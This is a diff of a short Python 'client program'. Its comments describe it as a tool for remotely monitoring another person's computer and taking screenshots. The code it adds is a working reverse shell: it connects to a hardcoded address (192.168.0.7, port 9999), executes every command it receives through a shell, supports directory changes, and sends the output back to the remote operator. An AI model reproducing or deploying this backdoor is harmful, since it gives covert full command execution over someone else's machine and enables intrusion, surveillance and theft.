@@ -8,7 +8,7 @@
 
 # Made by Drony420
 # This program can remotely connect to other person's computer, placing it into the command-running state and
-# executes screenshot script. It can monitor the client computer's current situation, retrieve and view picture
+# executes screenshots script. It can monitor the client computer's current situation, retrieve and view picture
 # files remotely. As a simple word, you can monitor your client's computer's situation over a remote connection.
 # Remote access allows this program to identify problems on the other person's computer or to prevent illegal behavior.
 # This program is a client program.
@@ -17,4 +17,21 @@ import os
 import socket
 import subprocess
 
-s = socket.socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = '192.168.0.7'
+port = 9999
+s.connect((host, port))
+
+while True:
+    data = s.recv(2048)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes, "utf-8")
+        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+        print(output_str)
+
+# 연결 종료(Closing connection)
+s.close()
